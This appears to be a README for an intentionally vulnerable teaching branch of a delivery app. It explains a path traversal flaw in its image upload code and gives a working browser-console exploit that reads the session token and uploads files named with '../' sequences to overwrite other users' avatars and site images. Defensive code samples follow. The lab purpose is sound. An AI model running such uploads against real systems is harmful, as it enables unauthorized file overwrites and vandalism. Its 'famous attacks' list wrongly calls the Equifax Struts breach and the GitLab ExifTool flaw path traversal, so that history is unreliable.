# Path Traversal Vulnerability Demo

## Overview

This branch demonstrates a **Path Traversal** vulnerability in the proof of delivery upload feature. The vulnerability exists in `FileSystemImageRepository.SaveImageCore()` where user-supplied filenames are accepted without proper path normalization and boundary validation. This allows authenticated users to write files to arbitrary locations within the application directory, including overwriting other users' images.

## What is Path Traversal?

Path Traversal (also known as Directory Traversal) is a web security vulnerability that allows attackers to read or write files outside the intended directory. By manipulating file path parameters with sequences like `../` (dot-dot-slash), attackers can traverse up the directory structure and access or modify files they shouldn't have access to.

### Impact

Path Traversal vulnerabilities can lead to:

- **Data Integrity Violations** - Overwriting legitimate user files
- **Unauthorized Access** - Reading sensitive configuration or data files
- **Service Disruption** - Corrupting critical application files
- **Reputation Damage** - Defacing user-visible content
- **Privilege Escalation** - Overwriting files to gain elevated access

Path Traversal consistently ranks in the OWASP Top 10 Web Application Security Risks.

## The Vulnerability

### Vulnerable Code Location

`projects/api/src/MBC.Endpoints/Images/FileSystemImageRepository.cs` - Line 110

```csharp
var fileName = originalFileName.Replace('/', _path.DirectorySeparatorChar);
```

The code accepts the user-supplied filename and uses it directly to construct the file path. The path normalization and boundary checks that would prevent traversal attacks have been removed (lines 122-131 and 215-218 were deleted).

### How It Works

1. **User uploads "proof of delivery"** with malicious filename containing `../` sequences
2. **Backend accepts filename** without validating path boundaries
3. **Path construction** combines base directory with malicious filename
4. **File written** to attacker-controlled location outside intended directory
5. **Target file overwritten** with attacker's image

**Security Controls That Still Exist:**

- File extension validation (`.jpg`, `.jpeg`, `.png`, `.webp` only)
- MIME type validation via magic byte inspection
- File size limits

**Why This Feels Realistic:**

Developers might remove path validation thinking "we're already validating file types, what could go wrong?" or to quickly fix a bug where legitimate files are being rejected.

## Attack Scenario: The Disgruntled Pilot

**Attacker:** Former pilot employee whose account hasn't been disabled
**Motive:** Vandalize rival pilots' profile avatars to damage their reputation
**Method:** Upload proof of delivery with traversal path to overwrite pilot avatars
**Impact:** Customer-facing pilot profiles show inappropriate or embarrassing images

The pilot avatars are stored in `assets/uploads/pilot-avatars/` with filenames like:

- `baloo.webp`
- `hathi.webp`
- `mowgli.webp`
- `raksha.webp`
- `shanti.jpg`

From the protected delivery proof upload directory (`assets/protected/deliveries/`), the traversal path is `../../uploads/pilot-avatars/{target}.webp`

## Exploitation Guide

### Prerequisites

1. Authenticated user account (any role with delivery access)
2. Valid delivery ID (can be your own delivery or any accessible delivery)
3. Malicious image file to upload
4. Browser with Developer Tools

### Step-by-Step Exploitation

**Step 1: Log in to the application**

Navigate to `http://localhost:4200` and sign in as any pilot or customer user.

**Step 2: Obtain your access token**

Open Browser DevTools (F12), go to Console tab, and run:

```javascript
const token = localStorage.getItem("mbc_access_token");
console.log(token);
```

Copy the token value.

**Step 3: Get a valid delivery ID**

Either create a delivery or use an existing one. You can find delivery IDs in the application or generate a new one.

**Step 4: Prepare your malicious image**

You can use any legitimate image file (must be valid JPEG, PNG, or WebP due to MIME validation). For this demo, we'll grab the sea plane logo from the app itself.

**Step 5: Execute the attack**

Run this script in the Browser Console (replace `YOUR_DELIVERY_ID` with an actual GUID):

```javascript
(async () => {
  const token = localStorage.getItem("mbc_access_token");
  const deliveryId = "b4628922-70ae-4a4d-9b4b-7a9897177303";
  const targetAvatar = "baloo.webp";

  const imageBlob = await fetch("/assets/sea-plane.webp").then((r) => r.blob());

  const maliciousFile = new File(
    [imageBlob],
    `../../uploads/pilot-avatars/${targetAvatar}`,
    { type: "image/webp" }
  );

  const formData = new FormData();
  formData.append("file", maliciousFile);

  const response = await fetch(
    `http://localhost:5110/api/v1/proofs/deliveries/${deliveryId}/upload`,
    {
      method: "POST",
      headers: { Authorization: `Bearer ${token}` },
      body: formData,
    }
  );

  const result = await response.json();
  console.log("Attack result:", result);

  if (response.ok) {
    console.log("âœ“ Successfully overwrote pilot avatar!");
    console.log("Navigate to the pilot list to see the vandalized avatar.");
  } else {
    console.error("Attack failed:", result);
  }
})();
```

**Step 6: Verify the attack**

Navigate to the pilots page and observe that the target pilot's avatar has been replaced with the sea plane image.

### Alternative Targets

You can target any file writable by the application. Try these variations:

**Overwrite other pilot avatars:**

```javascript
const targetAvatar = "mowgli.webp";
```

**Overwrite site images:**

```javascript
const maliciousFile = new File(
  [imageBlob],
  `../../uploads/sites/some-site-guid.jpg`,
  { type: "image/jpeg" }
);
```

**Cross-contaminate from protected to public:**

```javascript
const maliciousFile = new File(
  [imageBlob],
  `../../uploads/sites/public-exposed.webp`,
  { type: "image/webp" }
);
```

## Famous Path Traversal Attacks

### 1. **2017 - Equifax Data Breach**

- **Impact:** 147 million people's personal data exposed
- **Method:** Path traversal in Apache Struts framework (CVE-2017-5638)
- **Details:** Attackers exploited file upload vulnerability to execute commands
- **Cost:** $700 million settlement, CEO resignation

### 2. **2001 - Microsoft IIS 5.0 Unicode Bug**

- **Impact:** Millions of servers vulnerable to remote code execution
- **Method:** Unicode encoding bypass (`%c0%af` decoded to `/`)
- **Details:** `http://site/scripts/..%c0%af../winnt/system32/cmd.exe`
- **Significance:** Led to Code Red and Nimda worms

### 3. **2021 - GitLab Path Traversal (CVE-2021-22205)**

- **Impact:** Critical severity (CVSS 10.0), remote code execution
- **Method:** Path traversal in ExifTool image processing
- **Details:** Malicious image metadata could execute arbitrary commands
- **Affected:** GitLab instances worldwide

### 4. **2018 - Cisco ASA Path Traversal (CVE-2018-0296)**

- **Impact:** Directory traversal allowing arbitrary file reads
- **Method:** Unauthenticated path traversal via web interface
- **Details:** Could read sensitive configuration files, private keys
- **Severity:** CVSS 7.5 (High)

### 5. **2020 - F5 BIG-IP Path Traversal (CVE-2020-5902)**

- **Impact:** Remote code execution on enterprise network devices
- **Method:** Traversal through Traffic Management User Interface
- **Details:** Attackers could read/write files, execute commands
- **Deployed Patches:** Emergency patch released due to active exploitation

## Defense Strategies

### 1. **Never Trust User-Supplied Filenames**

Generate filenames server-side using GUIDs or sequential IDs:

```csharp
var fileName = $"{Guid.NewGuid()}{extension}";
```

### 2. **Path Normalization and Boundary Checks**

Always normalize paths and verify they remain within intended boundaries:

```csharp
var normalizedPath = Path.GetFullPath(physicalPath);
var normalizedRoot = Path.GetFullPath(storageRoot);

if (!normalizedPath.StartsWith(normalizedRoot, StringComparison.OrdinalIgnoreCase))
{
    throw new SecurityException("Path traversal detected");
}
```

### 3. **Use Path.GetFileName() Only**

If you must use user input, extract only the filename portion:

```csharp
var safeFileName = Path.GetFileName(userSuppliedName);
```

### 4. **Whitelist Allowed Characters**

Reject filenames containing suspicious characters:

```csharp
if (filename.Contains("..") || filename.Contains("/") || filename.Contains("\\"))
{
    return BadRequest("Invalid filename");
}
```

### 5. **Implement Proper Access Controls**

Ensure users can only upload to their own designated areas with strong authorization checks.

### 6. **Store Files Outside Web Root**

Store uploaded files outside the web-accessible directory tree when possible.

### 7. **Use Secure File Upload Libraries**

Leverage well-tested libraries that handle path security automatically.

## Resources and Further Reading

### Official Documentation

- [OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [CWE-22: Improper Limitation of a Pathname](https://cwe.mitre.org/data/definitions/22.html)
- [OWASP: Testing for Path Traversal](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include)

### Educational Resources

- [PortSwigger: Directory Traversal](https://portswigger.net/web-security/file-path-traversal)
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [HackTheBox: File Upload Labs](https://www.hackthebox.com/)

### Testing Tools

- [Burp Suite](https://portswigger.net/burp) - Includes path traversal detection
- [OWASP ZAP](https://www.zaproxy.org/) - Free security testing tool
- [dotdotpwn](https://github.com/wireghoul/dotdotpwn) - Path traversal fuzzer

## License Note

This vulnerable code is for **educational purposes only**. Never deploy vulnerable code to production environments. This demonstration is designed to teach secure file handling practices through realistic examples.
